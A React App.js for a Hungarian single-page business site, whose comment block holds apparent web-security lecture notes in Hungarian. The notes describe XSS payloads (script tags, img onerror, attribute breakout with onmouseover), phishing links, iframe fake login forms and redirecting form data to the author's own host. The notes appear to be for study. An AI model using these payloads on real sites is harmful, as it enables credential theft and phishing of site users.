import './App.css';
import Header from './Header/Header';
import IntroSection from './Components/IntroSection/IntroSection';
import CVSection from './Components/Introduction/Introduction';
import ServicesSection from './Components/ServicesSection/ServicesSection';
import HIW from './Components/HIW/HIW';
import ContactSection from './Components/Contact/Contact';
import React, { useState } from 'react';
import { LangProvider } from './Contexts/LangContext';
import Price from './Components/Price/PriceSection';
import Impress from './Components/Impress/Impress';
import { BrowserRouter as Router, Route, Switch, Redirect } from 'react-router-dom'

function App() {

  //SEO


  //frontend oldal, de nem csak az ottani védelem, hanem az ott való lefutás is játszik!
  //kéne bug bountyzni....! magamnál pedig react package keresés és vizsgálat mielőtt bedobom!
  //jelentkezz ilyen ingyenesre, megéri :D
  //unsafe characters Check! <> -> charcode save, eredeti helyett
  //text-area maxlength!!!!! -> overload, nincs hely!, kevesebb gép kell belassítani DDOS-nál
  //rejtett input ->debugként marad.; 
  //kérés headerben lehet rejteni
  //felhasználónév -> <script>alert("asd")</script> -> URL-ben van, tedd phishing e-mailbe, lefut nála --- ez areflected
  //ha blogbejegyzést dobsz, lehet "a href", és payed by click, hadd menjen; legyen a vége <!-- és akkor kikommentel minden alatta, lol :D
  //iframe-et is berakhatsz
  //lehet img hotlink, ami valahonnan nyúl le,pedig te máshol vagy, de az lassul be, na érted
  //betolhatsz saját reklámot!!! mekkora flash :D és lehet css-ezni is (persze, amit tagen belülre tehetsz) :D
  //extra bejelentkező felület iframe-el, amin elkérsz adatokat ezzel el is lopva :D
  //képet kiveheted a forráskódból, ha megcímzed az eredeti linket és a css is megvan, ill, ctrl+c - ctrl+V
  //foletol.png --> törölheted, ennyi, helyettesítve... ez fullos, nem kell szarakodni
  //lesd meg a burpöt
  //html,sql injection, XSS
  //extra from net


  //masodik eloadas
  /*
  script tag-et lehet variálni, kis-nagy, szóközök, nem stringként kellene ellenőrizni
    imgt dobsz be, de src-nek elérhetetlent adsz meg és az img onerror-ja lefuttat valami kódot, ez jó!
  vagy onclicket dobsz rá, ha rákattint lefut, márpedig rá fog
  ha adsz neki egy style display:none-t fel sem tűnik neki

vagy elfedi az oldalt (pos abs, 100% minden) és onmouseover, amikor csak fölémegy, lefut, nem kell az onclick


az alsó akkor van, ha egy inputba visszateszi az értéket (nem bennehagyja)
ha egy valueba teszi, akkor value="      onmouseover="alert('hack')    ">
ugyanez onfocus -> ha ez egy alert, akkor annyi, mert nem tud kijönni


remote megoldás:
script, de src-ben lekérem magamtól a remote.js-t, ami definiálja és lefuttatja önmagát
mondhatod iframenek is, akkor remote.html

<script>elküldés magadnak= document.forms[0].action="http://sajat"<script> <- ugyanez lehet onfocus is, ez volt " onfocus...
ez lehet urlben is, phishing (nem kell a két kör)


srcJavascript.png

OWASP ajánlás

amikor nem formoztam, hanem jsx, akkor nem megy, lol... béna vagy szerencse?

 
DOM-based -- react
*/

  return (
    <div>
      <LangProvider value="hun">
        <Router>
          <Switch>
            <Route exact path="/">
              <Header />
              <IntroSection />
              <CVSection />
              <ServicesSection />
              <HIW />
              <Price />
              <ContactSection />
              <Impress />
            </Route>
            <Redirect to="/" />
          </Switch>
        </Router>
      </LangProvider>
    </div>

  );
}

export default App;
